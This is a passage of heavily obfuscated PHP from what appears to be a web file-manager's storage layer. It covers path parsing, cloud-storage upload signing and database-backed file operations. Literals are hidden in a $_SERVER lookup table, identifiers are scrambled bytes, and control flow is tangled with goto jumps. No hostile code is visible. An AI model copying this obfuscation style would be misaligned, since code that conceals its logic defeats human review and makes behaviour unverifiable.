$a…êÀî…‡Š[76] => $aèêÅ¦¢Û, $a…êÀî…‡Š[1066] => !1, $a…êÀî…‡Š[1065] => $a…êÀî…‡Š[33]); if (is_array($F‘ç¯ßòÛÈ) && count($F‘ç¯ßòÛÈ) == 5) { $bå¼ôµ±Û = $a…êÀî…‡Š[1157] . $F‘ç¯ßòÛÈ[2] . $a…êÀî…‡Š[324]; if (in_array($bå¼ôµ±Û, $A¦Å’Å¢¡Ì)) { $A¼ŞÀŠÆ¿¶[$a…êÀî…‡Š[1066]] = $F‘ç¯ßòÛÈ[1]; $A¼ŞÀŠÆ¿¶[$a…êÀî…‡Š[29]] = $bå¼ôµ±Û; $A¼ŞÀŠÆ¿¶[$a…êÀî…‡Š[1158]] = substr($bå¼ôµ±Û, 1, -1); $A¼ŞÀŠÆ¿¶[$a…êÀî…‡Š[392]] = $F‘ç¯ßòÛÈ[3]; } $A¼ŞÀŠÆ¿¶[$a…êÀî…‡Š[1065]] = $F‘ç¯ßòÛÈ[4]; } goto Fñ·ÆêºÊÍ; b‰ö®„¡Ò²: $a…êÀî…‡Š =& $_SERVER[´¬]; $aèêÅ¦¢Û = self::clear($aèêÅ¦¢Û); $A¦Å’Å¢¡Ì = array_values(self::typeList()); goto f¯£ÄæÛÕ; Fñ·ÆêºÊÍ: $d‹­µéßÔ = array($a…êÀî…‡Š[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $A¼ŞÀŠÆ¿¶[$a…êÀî…‡Š[1121]] = in_array($A¼ŞÀŠÆ¿¶[$a…êÀî…‡Š[29]], $d‹­µéßÔ); return $A¼ŞÀŠÆ¿¶; goto a÷ˆÙíŞóŠ; a÷ˆÙíŞóŠ: } public static function isTruePath($CŸŞğ™ëßê) { goto F¨—Œææ¥; d»Äô„äÖ: if (strpos($CŸŞğ™ëßê, $EÅºÒ¨Ğ“¶[1124]) === 0) { return !0; } if (strpos($CŸŞğ™ëßê, $EÅºÒ¨Ğ“¶[1159]) === 0) { return !0; } if (strpos($CŸŞğ™ëßê, $EÅºÒ¨Ğ“¶[1160]) === 0) { return !0; } goto fóä´›“; fóä´›“: if (strpos($CŸŞğ™ëßê, $EÅºÒ¨Ğ“¶[1161]) === 0) { return !0; } return !1; goto b¯ÚÄÑğ½‘; F¨—Œææ¥: $EÅºÒ¨Ğ“¶ =& $_SERVER[´¬]; if (substr($CŸŞğ™ëßê, 0, 1) != $EÅºÒ¨Ğ“¶[1157]) { return !0; } if (strpos($CŸŞğ™ëßê, $EÅºÒ¨Ğ“¶[399]) === 0) { return !0; } goto d»Äô„äÖ; b¯ÚÄÑğ½‘: } public static function clear($eÑšÅÄï°) { goto bØíµíŞ£æ; DÙ‘ÈïƒØ›: return $eÑšÅÄï°; goto E¶ ÉÍÂ ö; AÉƒµœï„í: $eÑšÅÄï° = preg_replace($A¶Ç™å‹ò[1164], $A¶Ç™å‹ò[8], $eÑšÅÄï°); if ($eÑšÅÄï° == $A¶Ç™å‹ò[8]) { return $A¶Ç™å‹ò[8]; } $eÑšÅÄï° = rtrim($eÑšÅÄï°, $A¶Ç™å‹ò[8]); goto DÙ‘ÈïƒØ›; bØíµíŞ£æ: $A¶Ç™å‹ò =& $_SERVER[´¬]; $eÑšÅÄï° = str_replace(array($A¶Ç™å‹ò[1039], $A¶Ç™å‹ò[228]), $A¶Ç™å‹ò[50], $eÑšÅÄï°); $eÑšÅÄï° = str_replace($A¶Ç™å‹ò[97], $A¶Ç™å‹ò[8], $eÑšÅÄï°); goto aËîç‡˜å²; aËîç‡˜å²: $CÔ®ÌƒŠÏ = $A¶Ç™å‹ò[1162]; if (substr($eÑšÅÄï°, 0, 3) == $A¶Ç™å‹ò[1163]) { $eÑšÅÄï° = substr($eÑšÅÄï°, 3); } while (strstr($eÑšÅÄï°, $CÔ®ÌƒŠÏ)) { $eÑšÅÄï° = str_replace($CÔ®ÌƒŠÏ, $A¶Ç™å‹ò[8], $eÑšÅÄï°); } goto AÉƒµœï„í; E¶ ÉÍÂ ö: } public static function sourceID($D²×§™²öö) { $CÑÁˆ·‘¹ =& $_SERVER[´¬]; $A™ªİÀî“ = self::parse($D²×§™²öö); if ($A™ªİÀî“[$CÑÁˆ·‘¹[29]] !== self::KOD_SOURCE) { show_json(LNG($CÑÁˆ·‘¹[1165]), !1); } return $A™ªİÀî“[$CÑÁˆ·‘¹[392]]; } public static function make($EÑĞ‘œê¼) { if (!$EÑĞ‘œê¼) { return !1; } return self::makePath(self::KOD_SOURCE, intval($EÑĞ‘œê¼)); } public static function makeShare($cÏğèºÙ‚, $d‡…¢ôãí«) { return self::makePath(self::KOD_SHARE_ITEM, $cÏğèºÙ‚, $d‡…¢ôãí«); } public static function makeFileTypePath($Bè‘åëÙ¤•) { return self::makePath(self::KOD_USER_FILE_TYPE, $Bè‘åëÙ¤•); } public static function makeFileTagPath($Dñ¯Ô°ñ¨Š) { return self::makePath(self::KOD_USER_FILE_TAG, $Dñ¯Ô°ñ¨Š); } public static function makePath($eÍ¯½ëìŠï, $DÒó±èÏÕä = '', $A¶é«›ĞùÕ = '') { $CåŸÎ ãÉ´ =& $_SERVER[´¬]; $aŠ¿¾¾Øí = substr($eÍ¯½ëìŠï, 1, -1); $DÄ¿Ù÷¢°Š = $CåŸÎ ãÉ´[1166] . $aŠ¿¾¾Øí . $CåŸÎ ãÉ´[1167] . $DÒó±èÏÕä . $CåŸÎ ãÉ´[1168]; $DÄ¿Ù÷¢°Š = $A¶é«›ĞùÕ ? $DÄ¿Ù÷¢°Š . $A¶é«›ĞùÕ . $CåŸÎ ãÉ´[8] : $DÄ¿Ù÷¢°Š; return $DÄ¿Ù÷¢°Š; } public static function hashPath($E÷Æ„ªƒãæ, $D‰Ü¶¦ˆ’¥ = true) { goto d‚ç‡©¿Ù; cÜö­Ğˆ²: if (!$CåôŠ¸ ÈÍ && isset($fì Û¬©ä²[$bÊº–­Œ›«[394]])) { $fì Û¬©ä² = IO::info(KodIO::make($fì Û¬©ä²[$bÊº–­Œ›«[394]])); $CåôŠ¸ ÈÍ = _get($fì Û¬©ä², $bÊº–­Œ›«[1169], $bÊº–­Œ›«[33]); } if (!$CåôŠ¸ ÈÍ && $D‰Ü¶¦ˆ’¥) { $FªŞ…÷Íõ† = KodIO::parse($fì Û¬©ä²[$bÊº–­Œ›«[76]]); if (!$FªŞ…÷Íõ†[$bÊº–­Œ›«[29]]) { $CåôŠ¸ ÈÍ = IO::hashSimple($fì Û¬©ä²[$bÊº–­Œ›«[76]]); } } if (!$CåôŠ¸ ÈÍ) { $CåôŠ¸ ÈÍ = md5($fì Û¬©ä²[$bÊº–­Œ›«[76]] . $fì Û¬©ä²[$bÊº–­Œ›«[78]] . $fì Û¬©ä²[$bÊº–­Œ›«[84]]); } goto a‚îÛÓÆ•; a‚îÛÓÆ•: return $CåôŠ¸ ÈÍ; goto d¿ÔÆ¾¸›˜; d‚ç‡©¿Ù: $bÊº–­Œ›« =& $_SERVER[´¬]; $fì Û¬©ä² = is_array($E÷Æ„ªƒãæ) ? $E÷Æ„ªƒãæ : IO::info($E÷Æ„ªƒãæ); $CåôŠ¸ ÈÍ = _get($fì Û¬©ä², $bÊº–­Œ›«[1169], $bÊº–­Œ›«[33]); goto cÜö­Ğˆ²; d¿ÔÆ¾¸›˜: } public static function initSystemPath() { goto e¹¼ ¡¥·Š; e’Óß†‡±—: IOHistory::bindEvent(); goto fÔôˆ”´ÂÊ; eÄº¸§°¬Æ: define($Bâ–ÁõÀĞî[1172], self::systemPath($Bâ–ÁõÀĞî[1173])); define($Bâ–ÁõÀĞî[1174], self::systemPath($Bâ–ÁõÀĞî[1175])); define($Bâ–ÁõÀĞî[1176], self::systemPath($Bâ–ÁõÀĞî[1177])); goto e’Óß†‡±—; e¹¼ ¡¥·Š: $Bâ–ÁõÀĞî =& $_SERVER[´¬]; if (defined($Bâ–ÁõÀĞî[1170])) { return; } define($Bâ–ÁõÀĞî[1170], self::systemPath($Bâ–ÁõÀĞî[1171])); goto eÄº¸§°¬Æ; fÔôˆ”´ÂÊ: } public static function systemPath($c›àÄ‰áµ) { goto AÇ¾¸˜ïë—; aöÔãï‚äŸ: if ($d˜Œ¢ÑŠõ‚) { return $d˜Œ¢ÑŠõ‚; } if ($c›àÄ‰áµ == $Cíªó´ë¬Ï[1171]) { $d˜Œ¢ÑŠõ‚ = self::make(Model($Cíªó´ë¬Ï[790])->systemRootPathAdd($Cíªó´ë¬Ï[504])); } else { $d˜Œ¢ÑŠõ‚ = self::systemPath($Cíªó´ë¬Ï[1171]); $cÂ‚•Í‘ = self::sourceID($d˜Œ¢ÑŠõ‚); $d˜Œ¢ÑŠõ‚ = self::make(Model($Cíªó´ë¬Ï[790])->mkdir($cÂ‚•Í‘, $c›àÄ‰áµ)); } Model($Cíªó´ë¬Ï[730])->set($f¹Çó¹„´©, $d˜Œ¢ÑŠõ‚); goto b®êÑ”Ä§; AÇ¾¸˜ïë—: $Cíªó´ë¬Ï =& $_SERVER[´¬]; $f¹Çó¹„´© = $Cíªó´ë¬Ï[1178] . ucfirst($c›àÄ‰áµ); $d˜Œ¢ÑŠõ‚ = Model($Cíªó´ë¬Ï[730])->get($f¹Çó¹„´©); goto aöÔãï‚äŸ; b®êÑ”Ä§: return $d˜Œ¢ÑŠõ‚; goto E›±˜Å‚âŠ; E›±˜Å‚âŠ: } public static function systemFolder($eŠšùÒ˜áõ) { $F…Õ„ƒŒïİ = IO_PATH_SYSTEM_SOURCE . $eŠšùÒ˜áõ; $a¢…ÙãÚÆó = Cache::get($F…Õ„ƒŒïİ); if (!$a¢…ÙãÚÆó) { $dÅŒÖ÷œ‚À = IO::infoFull($F…Õ„ƒŒïİ); if (!$dÅŒÖ÷œ‚À) { $a¢…ÙãÚÆó = IO::mkdir($F…Õ„ƒŒïİ, REPEAT_SKIP); } else { $a¢…ÙãÚÆó = $dÅŒÖ÷œ‚À[$_SERVER[´¬][76]]; } Cache::set($F…Õ„ƒŒïİ, $a¢…ÙãÚÆó, 3600 * 10); } return $a¢…ÙãÚÆó; } public static function defaultDriver() { return Model($_SERVER[´¬][727])->defaultDriver(); } public static function defaultIO() { $eÁáÓÖáˆô =& $_SERVER[´¬]; $eÜìíéŒò = self::defaultDriver(); return $eÁáÓÖáˆô[1179] . $eÜìíéŒò[$eÁáÓÖáˆô[392]] . $eÁáÓÖáˆô[1168]; } public static function defaultDriverInit() { static $EÈĞ«ê‰ä = false; if ($EÈĞ«ê‰ä) { return $EÈĞ«ê‰ä; } $EÈĞ«ê‰ä = IO::init(self::defaultIO()); return $EÈĞ«ê‰ä; } public static function fileTypeList() { $Dğà¯¡ÌÚ =& $_SERVER[´¬]; $EÂéŠåïŒ­ = $GLOBALS[$Dğà¯¡ÌÚ[6]][$Dğà¯¡ÌÚ[1180]]; foreach ($EÂéŠåïŒ­ as $f½¯ñÛòœè => $A»¾îÙ²†İ) { $B¸ĞÈ«è¾Ã = $Dğà¯¡ÌÚ[1181] . $f½¯ñÛòœè; $a¬ô½ßÇù = LNG($B¸ĞÈ«è¾Ã); if ($B¸ĞÈ«è¾Ã != $a¬ô½ßÇù) { $EÂéŠåïŒ­[$f½¯ñÛòœè][$Dğà¯¡ÌÚ[28]] = $a¬ô½ßÇù; } } return $EÂéŠåïŒ­; } public static function transferType($eõˆš×îÀ¦, $d¯•½•Óîâ) { goto aÖâ²×óÍÚ; aÖâ²×óÍÚ: $B‚†‡¤õŒ =& $_SERVER[´¬]; $c•‹’æ¯¼ = self::driverType($eõˆš×îÀ¦); $cÈ¿¹Ù»Ôø = self::driverType($d¯•½•Óîâ); goto CßÈ®Ş­ñÀ; AÛ¯†·Ä¦î: return $B‚†‡¤õŒ[1184]; goto cø™Õ¡¹Û¬; CßÈ®Ş­ñÀ: if ($c•‹’æ¯¼[$B‚†‡¤õŒ[29]] == $cÈ¿¹Ù»Ôø[$B‚†‡¤õŒ[29]] && $c•‹’æ¯¼[$B‚†‡¤õŒ[1182]] == $cÈ¿¹Ù»Ôø[$B‚†‡¤õŒ[1182]]) { return $B‚†‡¤õŒ[1183]; } if ($c•‹’æ¯¼[$B‚†‡¤õŒ[29]] == $B‚†‡¤õŒ[831] && $cÈ¿¹Ù»Ôø[$B‚†‡¤õŒ[29]] == $B‚†‡¤õŒ[106]) { return $B‚†‡¤õŒ[1095]; } if ($c•‹’æ¯¼[$B‚†‡¤õŒ[29]] == $B‚†‡¤õŒ[106] && $cÈ¿¹Ù»Ôø[$B‚†‡¤õŒ[29]] == $B‚†‡¤õŒ[831]) { return $B‚†‡¤õŒ[107]; } goto AÛ¯†·Ä¦î; cø™Õ¡¹Û¬: } public static function driverType($Càñãì·Â) { goto b¸­–Ó—·ò; f×¡œé†÷„: if ($b¤Ä‘¼Ÿ›õ == $câ’½‹·…[718] || $b¤Ä‘¼Ÿ›õ == $câ’½‹·…[1186] || $b¤Ä‘¼Ÿ›õ == $câ’½‹·…[1187]) { $Càñãì·Â = self::defaultDriverInit(); } else { if ($b¤Ä‘¼Ÿ›õ == $câ’½‹·…[1102] || $b¤Ä‘¼Ÿ›õ == $câ’½‹·…[1188]) { $Càñãì·Â = IO::init($Càñãì·Â->pathParse[$câ’½‹·…[1049]]); } } $b¤Ä‘¼Ÿ›õ = str_replace($câ’½‹·…[1185], $câ’½‹·…[33], strtolower($Càñãì·Â->getType())); if ($b¤Ä‘¼Ÿ›õ == $câ’½‹·…[106]) { return array($câ’½‹·…[29] => $câ’½‹·…[106], $câ’½‹·…[1182] => $câ’½‹·…[33], $câ’½‹·…[76] => $E†§ËŒ©Ş ); } goto Bãâ¸Ì¨Ô; b¸­–Ó—·ò: $câ’½‹·… =& $_SERVER[´¬]; $E†§ËŒ©Ş  = $Càñãì·Â->path; $b¤Ä‘¼Ÿ›õ = str_replace($câ’½‹·…[1185], $câ’½‹·…[33], strtolower($Càñãì·Â->getType())); goto f×¡œé†÷„; Bãâ¸Ì¨Ô: return array($câ’½‹·…[29] => $câ’½‹·…[831], $câ’½‹·…[1182] => $Càñãì·Â->pathDriver, $câ’½‹·…[76] => $E†§ËŒ©Ş ); goto A’Í…®; A’Í…®: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($c«³áÇ–Éï) { parent::__construct($c«³áÇ–Éï); $this->signatureVersion($_SERVER[´¬][211]); } public function uploadFormData($b™èÚ¶…¶Ñ, $C¼ôÏâÚ° = 3600) { goto fœŠĞå¼µñ; aˆ‚§¥ÒÂ: return $B—æ®„í´; goto E‹…Œ¯‚ä; fœŠĞå¼µñ: $Fóøîôö =& $_SERVER[´¬]; $bï¨õë–ˆ = $Fóøîôö[191]; $fï†¥åöÀô = $Fóøîôö[229]; goto e¥Ñ‹åè›»; e¥Ñ‹åè›»: $A‚Ù§Õ½… = $Fóøîôö[1189]; $f”­±ä–‘“ = gmdate($Fóøîôö[1190], time() + $C¼ôÏâÚ°); $DÈ¥Î¶ŒØÏ = (string) time() . $Fóøîôö[68] . (string) (time() + $C¼ôÏâÚ°); goto cÈÊ¡¸Æ»‡; DÍíöÇ: $Fø¨µ—­° = sha1($FëÇ¡Á‘À); $fÍËºÊ„¯ = hash_hmac($Fóøîôö[229], $Fø¨µ—­°, $DàÍ–Û×ä›); $B—æ®„í´ = array($Fóøîôö[1193] => $bï¨õë–ˆ, $Fóøîôö[1197] => $A‚Ù§Õ½…, $Fóøîôö[1201] => base64_encode($FëÇ¡Á‘À), $Fóøîôö[1198] => $fï†¥åöÀô, $Fóøîôö[1199] => $this->accessKey, $Fóøîôö[1202] => $DÈ¥Î¶ŒØÏ, $Fóøîôö[1203] => $fÍËºÊ„¯, $Fóøîôö[175] => $this->getHost()); goto aˆ‚§¥ÒÂ; cÈÊ¡¸Æ»‡: $FëÇ¡Á‘À = array($Fóøîôö[1191] => $f”­±ä–‘“, $Fóøîôö[1192] => array(array($Fóøîôö[1193] => $bï¨õë–ˆ), array($Fóøîôö[1194] => $this->bucket), array($Fóøîôö[1195], $Fóøîôö[1196], $Fóøîôö[33]), array($Fóøîôö[1197] => $A‚Ù§Õ½…), array($Fóøîôö[1198] => $fï†¥åöÀô), array($Fóøîôö[1199] => $this->accessKey), array($Fóøîôö[1200] => $DÈ¥Î¶ŒØÏ))); $FëÇ¡Á‘À = json_encode($FëÇ¡Á‘À); $DàÍ–Û×ä› = hash_hmac($Fóøîôö[229], $DÈ¥Î¶ŒØÏ, $this->secret); goto DÍíöÇ; E‹…Œ¯‚ä: } public function fileOutLink($A†¦”ºÜõõ) { $C«º‹ĞØ‘ =& $_SERVER[´¬]; if (substr($A†¦”ºÜõõ, 0, 7) == $C«º‹ĞØ‘[1204]) { $A†¦”ºÜõõ = $C«º‹ĞØ‘[1205] . substr($A†¦”ºÜõõ, 7); } header($C«º‹ĞØ‘[159] . $A†¦”ºÜõõ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($d„‰«Š„ÌŸ) { $this->pathParse = $d„‰«Š„ÌŸ; $this->model = Model($_SERVER[´¬][1206]); } public function getPath($fËÔöÉ¥ÙÑ) { return trim($fËÔöÉ¥ÙÑ, $_SERVER[´¬][8]); } public function pathFather($b§‰óÇ¯·) { $AÌÂÉ…ã” = $this->parse($b§‰óÇ¯·); $AÌÂÉ…ã” = $this->infoSimple($b§‰óÇ¯·); return $AÌÂÉ…ã” ? $AÌÂÉ…ã”[$_SERVER[´¬][476]] : !1; } public function pathThis($c³Š½øô³Š) { $C«ÈĞ Íìã = $this->infoSimple($c³Š½øô³Š); return $C«ÈĞ Íìã ? $C«ÈĞ Íìã[$_SERVER[´¬][28]] : !1; } public function getPathOuter($B®µæ˜‚¯®) { if (!$B®µæ˜‚¯®) { return $B®µæ˜‚¯®; } $AäŠÁâÒ = $this->parse($B®µæ˜‚¯®); return KodIO::make($AäŠÁâÒ[$_SERVER[´¬][392]]); } public function copyFolderFromIO($FÈ›Æ‡µÄœ, $bïÛ¡ĞñÀÉ, $d¯×‚Îˆ²Ä, $CÙÅ‹Ë”œ, $a¢©—ß) { $bØšç«Ò«¼ = $this->model->copyFolderFromIO($FÈ›Æ‡µÄœ, $bïÛ¡ĞñÀÉ, $d¯×‚Îˆ²Ä, $CÙÅ‹Ë”œ, $a¢©—ß); return KodIO::make($bØšç«Ò«¼); } public function isParentOf($eª£¥¶Ë‚Á, $E‚Æ‰±Š‚Ã) { return $this->model->isParentOf($eª£¥¶Ë‚Á, $E‚Æ‰±Š‚Ã); } public function mkfile($d¸Öƒ¯ÚõÍ, $BªÓ ƒ±° = '', $eíÉ–¥Ú—‚ = REPEAT_RENAME) { $d¿êõõƒ±‰ =& $_SERVER[´¬]; $d¢«”å§•Ä = $this->parse($d¸Öƒ¯ÚõÍ); $d¸Öƒ¯ÚõÍ = $d¢«”å§•Ä[$d¿êõõƒ±‰[392]]; for ($e“‚„Š´Œß = 0; $e“‚„Š´Œß < count($d¢«”å§•Ä[$d¿êõõƒ±‰[1207]]); $e“‚„Š´Œß++) { $fÔ–¹ø“Ÿ = $d¢«”å§•Ä[$d¿êõõƒ±‰[1207]][$e“‚„Š´Œß]; if ($e“‚„Š´Œß == count($d¢«”å§•Ä[$d¿êõõƒ±‰[1207]]) - 1) { $d¸Öƒ¯ÚõÍ = $this->model->mkfile($d¸Öƒ¯ÚõÍ, $fÔ–¹ø“Ÿ, $BªÓ ƒ±°, $eíÉ–¥Ú—‚); break; } $d¸Öƒ¯ÚõÍ = $this->model->mkdir($d¸Öƒ¯ÚõÍ, $fÔ–¹ø“Ÿ, REPEAT_SKIP); } return $this->getPathOuter($d¸Öƒ¯ÚõÍ); } public function mkdir($dÔ¸ëåè¦­, $cŠÀ¸±»É§ = REPEAT_SKIP) { $c´¹ãæ£šÃ =& $_SERVER[´¬]; $a¼“œ‡¡íß = $this->parse($dÔ¸ëåè¦­); $dÔ¸ëåè¦­ = $a¼“œ‡¡íß[$c´¹ãæ£šÃ[392]]; for ($FŠÇ›äŠ‡ = 0; $FŠÇ›äŠ‡ < count($a¼“œ‡¡íß[$c´¹ãæ£šÃ[1207]]); $FŠÇ›äŠ‡++) { $C¶Ûö²Ìğé = $a¼“œ‡¡íß[$c´¹ãæ£šÃ[1207]][$FŠÇ›äŠ‡]; $dÔ¸ëåè¦­ = $this->model->mkdir($dÔ¸ëåè¦­, $C¶Ûö²Ìğé, $cŠÀ¸±»É§); } return $this->getPathOuter($dÔ¸ëåè¦­); } public function copyFile($e½ºàñÊƒ, $BáëàŒ¢ô‘, $A´ß˜³ˆ‰¯ = REPEAT_REPLACE) { $D©Ñ”ÒÊÖ‘ =& $_SERVER[´¬]; $cóå…í‘² = $this->parse($BáëàŒ¢ô‘); $f‚§´ˆ½¾ = $this->model->copy($e½ºàñÊƒ, $cóå…í‘²[$D©Ñ”ÒÊÖ‘[392]], $A´ß˜³ˆ‰¯, $cóå…í‘²[$D©Ñ”ÒÊÖ‘[76]]); return $f‚§´ˆ½¾ ? $this->getPathOuter($f‚§´ˆ½¾) : !1; } public function moveFile($CæÊ‘Â½õ¿, $cò¸Í†£¹µ, $f¥Åêœ¶Áì = REPEAT_REPLACE) { $fˆ÷ÕŠÆŠí =& $_SERVER[´¬]; $Bè‰½æ‰¶É = $this->parse($cò¸Í†£¹µ); $aÆ§¬ôÇ’™ = $this->model->move($CæÊ‘Â½õ¿, $Bè‰½æ‰¶É[$fˆ÷ÕŠÆŠí[392]], $f¥Åêœ¶Áì, $Bè‰½æ‰¶É[$fˆ÷ÕŠÆŠí[76]]); return $aÆ§¬ôÇ’™ ? $this->getPathOuter($aÆ§¬ôÇ’™) : !1; } public function copy($dÆ„÷öñëÌ, $EÆÆŸŞà, $dÚ‰ñ¡Ú© = REPEAT_REPLACE) { $A‡ù¶¬˜† = $this->parse($EÆÆŸŞà); $fÜÅ¨ì½Ş“ = $this->model->copy($dÆ„÷öñëÌ, $A‡ù¶¬˜†[$_SERVER[´¬][392]], $dÚ‰ñ¡Ú©); return $fÜÅ¨ì½Ş“ ? $this->getPathOuter($fÜÅ¨ì½Ş“) : !1; } public function moveSameAllow() { } public function move($b¶’Üµ¸‹Ô, $D×ÚÛ§ùœ‘, $BÀÛ‰‹ŠÜ = REPEAT_REPLACE) { $F¹³‚×óÅø = $this->parse($D×ÚÛ§ùœ‘); $CèåíòÏò¦ = $this->model->move($b¶’Üµ¸‹Ô, $F¹³‚×óÅø[$_SERVER[´¬][392]], $BÀÛ‰‹ŠÜ); return $CèåíòÏò¦ ? $this->getPathOuter($CèåíòÏò¦) : !1; } public function remove($CåõÄíô—¥, $BôÅ–©¨ = true) { return $this->model->remove($CåõÄíô—¥, $BôÅ–©¨); } public function rename($eÓÌŞéêù, $F·Ö‰Œ¿ğ) { $a´»…ÃèÉ = $this->model->rename($eÓÌŞéêù, $F·Ö‰Œ¿ğ); return $a´»…ÃèÉ ? $this->getPathOuter($eÓÌŞéêù) : $a´»…ÃèÉ; } public function size($Ašß²“ÎÚ«) { $AÛææ×ä = $this->infoSimple($Ašß²“ÎÚ«); return $AÛææ×ä ? $AÛææ×ä[$_SERVER[´¬][78]] : 0; } public function infoSimple($e’ˆˆæë™ğ) { return $this->model->sourceInfo($e’ˆˆæë™ğ); } public function info($a­ÂˆïÜÙˆ) { return $this->infoParse($a­ÂˆïÜÙˆ); } public function infoAuth($Aç‚å°ï§¨) { return $this->infoParse($Aç‚å°ï§¨, !1, !0); } public function infoWithChildren($c À–µíª) { return $this->infoParse($c À–µíª, !0); } protected function infoParse($aÔ„ó´ÙÀ, $f‚ÜÛ = false, $aĞÜì³İ›æ = false) { if (!$f‚ÜÛ) { return $this->model->pathInfo($aÔ„ó´ÙÀ, $aĞÜì³İ›æ); } return $this->model->pathInfoMore($aÔ„ó´ÙÀ); } public function infoFull($D ëÚ«…) { $c´‡À¤õ¸ã =& $_SERVER[´¬]; $cÏ°ÊğöËµ = explode($c´‡À¤õ¸ã[8], $D ëÚ«…); $a‰ÁÁ¦çŠÕ = implode($c´‡À¤õ¸ã[8], array_splice($cÏ°ÊğöËµ, 1)); return $this->model->pathInfoByPath($cÏ°ÊğöËµ[0], $a‰ÁÁ¦çŠÕ); } public function hashSimple($DâË®¨²É§) { $A»©ÕÏğ„Ä =& $_SERVER[´¬]; $bÓÙº”šçŒ = $this->infoWithChildren($DâË®¨²É§); return $bÓÙº”šçŒ[$A»©ÕÏğ„Ä[164]][$A»©ÕÏğ„Ä[171]]; } public function hashMd5($böŞ—æ”„š) { $C¹¦ªŞòµ =& $_SERVER[´¬]; $Dç—§ÔíÌ = $this->infoWithChildren($böŞ—æ”„š); return $Dç—§ÔíÌ[$C¹¦ªŞòµ[164]][$C¹¦ªŞòµ[170]]; } public function exist($D¡®ÆŠ µ¬) { $Cè×™Úƒ =& $_SERVER[´¬]; $D¿Êº¼ä¨¾ = $this->parse($D¡®ÆŠ µ¬); if (!$D¿Êº¼ä¨¾[$Cè×™Úƒ[76]]) { return $this->isFile($D¡®ÆŠ µ¬) || $this->isFolder($D¡®ÆŠ µ¬); } $bÈùö¥îæ = array($Cè×™Úƒ[393] => $D¿Êº¼ä¨¾[$Cè×™Úƒ[392]], $Cè×™Úƒ[28] => $D¿Êº¼ä¨¾[$Cè×™Úƒ[76]]); $D‘‚öî‹œİ = $this->model->where($bÈùö¥îæ)->find(); return $D‘‚öî‹œİ ? !0 : !1; } public function isFile($c¦Ğ…¶­©ä) { $a¶æ™Õ•î =& $_SERVER[´¬]; $câò˜Ëà‘Í = $this->infoSimple($c¦Ğ…¶­©ä); return $câò˜Ëà‘Í && $câò˜Ëà‘Í[$a¶æ™Õ•î[401]] == $a¶æ™Õ•î[87] ? !1 : !0; } public function isFolder($c®Ö³ ¨) { $dßÑƒ‡â” =& $_SERVER[´¬]; $CÛ£°íè¼ = $this->infoSimple($c®Ö³ ¨); return $CÛ£°íè¼ && $CÛ£°íè¼[$dßÑƒ‡â”[401]] == $dßÑƒ‡â”[87] ? !0 : !1; } public function listPath($Dô½¡ô››×, $DÛİ¢¬¤… = false) { $BâÚ¶òãë¬ =& $_SERVER[´¬]; if ($Dô½¡ô››× == $BâÚ¶òãë¬[33]) { return !1; } $EùÒ‰íö¡Œ = array($BâÚ¶òãë¬[393] => $Dô½¡ô››×); if ($DÛİ¢¬¤…) { return $this->model->listSource($EùÒ‰íö¡Œ, -1); } return $this->model->listSource($EùÒ‰íö¡Œ); } public function has($A­š¥ÓñÁÀ, $eËáë˜°ª = false, $FÉ¹‘Ÿ…”Õ = null) { $cö‹Æ³±“ô =& $_SERVER[´¬]; $eóæ¢ØâÁÍ = $this->infoWithChildren($A­š¥ÓñÁÀ); if ($eËáë˜°ª) { return array($cö‹Æ³±“ô[203] => $eóæ¢ØâÁÍ[$cö‹Æ³±“ô[203]], $cö‹Æ³±“ô[202] => $eóæ¢ØâÁÍ[$cö‹Æ³±“ô[202]]); } return $FÉ¹‘Ÿ…”Õ ? $eóæ¢ØâÁÍ[$cö‹Æ³±“ô[203]] : $eóæ¢ØâÁÍ[$cö‹Æ³±“ô[202]]; } public function listAll($C‘Ä„êÜã”) { $F·Û¿¶‘ŸÒ = IO::info($this->pathParse[$_SERVER[´¬][76]]); if (!$F·Û¿¶‘ŸÒ) { return array(); } return $this->model->listAll($C‘Ä„êÜã”); } public function getContent($a¾§Ğ˜ö¿á) { return $this->model->getContent($a¾§Ğ˜ö¿á); } public function setContent($e’ğ‰Íˆ†§, $bİ–÷ê£²¶ = '') { return $this->model->setContent($e’ğ‰Íˆ†§, $bİ–÷ê£²¶); } public function fileSubstr($Fó¬ºò£¢, $aŠÛÁĞÈ¦³, $B¤òÛÇŠÀæ) { return $this->model->fileSubstr($Fó¬ºò£¢, $aŠÛÁĞÈ¦³, $B¤òÛÇŠÀæ); } public function download($A¨÷šÓ×Ğñ, $B’ŸÕ¥¼¤‹ = '') { $e´ä»¤²¿† = get_path_father($B’ŸÕ¥¼¤‹); $C¥ó°±ñºÉ = get_path_this($B’ŸÕ¥¼¤‹); $aÊ­Ë¹Èìõ = $this->model->fileInfoGet($A¨÷šÓ×Ğñ); $E‹Œ¢¸Ô¾¿ = IO::copy($aÊ­Ë¹Èìõ[$_SERVER[´¬][76]], $e´ä»¤²¿†, !1, $C¥ó°±ñºÉ); return $E‹Œ¢¸Ô¾¿; } public function setModifyTime($FÑ‰ÕªÖ‚ï, $aÒ·œè¨éÛ = '') { $aÜŞÎó™ŸÑ =& $_SERVER[´¬]; if (!$FÑ‰ÕªÖ‚ï) { return; } $this->model->where(array($aÜŞÎó™ŸÑ[408] => $FÑ‰ÕªÖ‚ï))->save(array($aÜŞÎó™ŸÑ[84] => $aÒ·œè¨éÛ)); } public function upload($B¿²¶ÊÛ´, $a¾ØÙÒ“¢, $c³éİêñ½æ = false, $C½Œ±‹£ëº = REPEAT_REPLACE) { $b¾‰ ‹è­† =& $_SERVER[´¬]; $fŠê¤¼­ñÙ = $this->parse($B¿²¶ÊÛ´); $cˆ¶ø®Óá‰ = $this->model->addFile($fŠê¤¼­ñÙ[$b¾‰ ‹è­†[392]], $a¾ØÙÒ“¢, $fŠê¤¼­ñÙ[$b¾‰ ‹è­†[76]], $c³éİêñ½æ, $C½Œ±‹£ëº); return $this->getPathOuter($cˆ¶ø®Óá‰); } public function uploadFileByID($B¬İè–ôÇğ, $bí®“ÔÖÒã, $F‡•â¶ÆÒˆ) { $f½°†º˜Ÿˆ =& $_SERVER[´¬]; $e½„•¥„î = $this->parse($B¬İè–ôÇğ); $B²ÉÚ†ŞìÕ = $this->model->addFileByFileID($e½„•¥„î[$f½°†º˜Ÿˆ[392]], $bí®“ÔÖÒã, 